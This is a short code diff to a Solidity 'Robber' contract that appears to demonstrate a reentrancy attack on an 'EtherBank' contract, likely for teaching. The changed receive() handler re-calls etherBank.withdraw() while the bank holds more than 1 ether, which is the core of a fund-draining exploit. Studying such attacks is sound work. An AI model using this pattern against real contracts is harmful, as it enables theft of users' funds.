@@ -5,13 +5,15 @@ import "./EtherBank.sol";
 
 contract Robber {
     EtherBank public etherBank;
+    event ReceivedEth(uint256 amount);
+
     uint256 public constant AMOUNT = 1 ether;
 
     constructor(address _etherBankAddress) {
         etherBank = EtherBank(_etherBankAddress);
     }
 
-    fallback() external payable {
+    receive() external payable {
         if (address(etherBank).balance > AMOUNT) {
             etherBank.withdraw();
         }
